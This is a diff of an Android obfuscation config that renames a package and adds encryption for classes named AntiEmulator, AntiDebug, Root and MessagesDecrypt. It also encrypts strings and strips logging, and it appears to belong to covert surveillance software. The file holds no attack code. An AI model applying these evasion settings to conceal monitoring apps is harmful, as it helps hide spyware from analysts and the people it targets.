@@ -1,17 +1,17 @@
 
 #-verbose
--encryptclasses com.android.deviceinfo.util.AntiEmulator,com.android.deviceinfo.MessagesDecrypt,
-		com.android.deviceinfo.Root,com.android.deviceinfo.Core,
-		com.android.deviceinfo.util.AntiDebug,com.android.deviceinfo.util.AntiEmulator
+-encryptclasses com.android.dvci.util.AntiEmulator,com.android.dvci.MessagesDecrypt,
+		com.android.dvci.Root,com.android.dvci.Core,
+		com.android.dvci.util.AntiDebug,com.android.dvci.util.AntiEmulator
 		
-#-encryptclasses com.android.deviceinfo.util.AntiEmulator,com.android.deviceinfo.Root
+#-encryptclasses com.android.dvci.util.AntiEmulator,com.android.dvci.Root
 
-#-encryptclasses com.android.deviceinfo.*
+#-encryptclasses com.android.dvci.*
 -encryptstrings "http://*","https://*","/data/data/*","/auth/user_data/*","l*",".lost.found"
 -encryptstrings "AES*","*SELECT*","select*","gt-*","*.google.com","getApplicationInfo"
 
 -encryptclasses com.android.m.*
--encryptstrings "KEY_*"
+-encryptstrings "KY*"
 #-encryptstrings "KEN_*" 
 
 -accessthroughreflection class android.content.pm.ApplicationInfo {
@@ -34,16 +34,19 @@
 
 # l'ottimizzazione seguente fa crashare smali, disabilitare solo se occorre manipolare il codice
 #-optimizations !method/marking/final
-#-optimizations !method/*
+-optimizations !method/inlining/*
 
 #-classobfuscationdictionary "compact.txt"
+-classobfuscationdictionary "keywords.txt"
+-packageobfuscationdictionary "keywords.txt"
+-obfuscationdictionary "keywords.txt"
 
-#togliere l'offuscamento di com.android.deviceinfo.Core.isServiceRunning
--keepclassmembers class com.android.deviceinfo.Core {
+#togliere l'offuscamento di com.android.dvci.Core.isServiceRunning
+-keepclassmembers class com.android.dvci.Core {
     public static boolean isServiceRunning();
 }
 
--keepclassmembers class com.android.deviceinfo.util.Instrument
+#-keepclassmembers class com.android.dvci.util.Instrument
 
 -keepresourcexmlattributenames assets/*.bin, 
     manifest/installLocation,
@@ -53,26 +56,20 @@
     res/values/*
 
 -keep public class android.media.AmrInputStream
--keep public class com.android.deviceinfo.gui.CGui
--keep public class com.android.deviceinfo.BM
--keep public class com.android.deviceinfo.listener.BAc
--keep public class com.android.deviceinfo.listener.BSt
--keep public class com.android.deviceinfo.listener.BSm
--keep public class com.android.deviceinfo.listener.BC
--keep public class com.android.deviceinfo.optimize.NetworkOptimizer
--keep public class com.android.deviceinfo.util.Instrument
-#-keep public class com.android.deviceinfo.util.AudioEncoder
-#-keep public class com.android.deviceinfo.module.call.Chunk
-#-keep public class com.android.deviceinfo.module.call.EncodingTask
+-keep public class com.android.dvci.BM
+-keep public class com.android.dvci.listener.AR
+-keep public class com.android.dvci.optimize.NetworkOptimizer
+-keep public class com.android.dvci.util.Instrument
+
 -keep class com.musicg.** { *; }
 -keep class com.sun.media.sound.** { *; }
 -keep class android.media.** {*;}
     
-#-assumenosideeffects class android.util.Log {
-#    public static boolean isLoggable(java.lang.String, int);
-#    public static int v(...);
-#    public static int i(...);
-#    public static int w(...);
-#    public static int d(...);
-#    public static int e(...);
-#}
+-assumenosideeffects class android.util.Log {
+    public static boolean isLoggable(java.lang.String, int);
+    public static int v(...);
+    public static int i(...);
+    public static int w(...);
+    public static int d(...);
+    public static int e(...);
+}
